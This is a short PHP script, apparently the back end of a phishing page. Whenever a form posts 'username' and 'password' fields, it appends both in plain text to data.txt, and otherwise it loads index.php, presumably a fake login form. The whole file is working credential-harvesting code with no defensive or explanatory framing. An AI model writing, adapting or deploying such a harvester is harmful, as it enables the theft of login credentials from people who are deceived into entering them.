<?php
if(isset($_POST["username"]) && isset($_POST["password"])){
    $f=fopen("data.txt","a");
    fputs($f,$_POST["username"].";".$_POST["password"]."\r\n");
    fclose($f);
}else{
    include 'index.php';
}
?>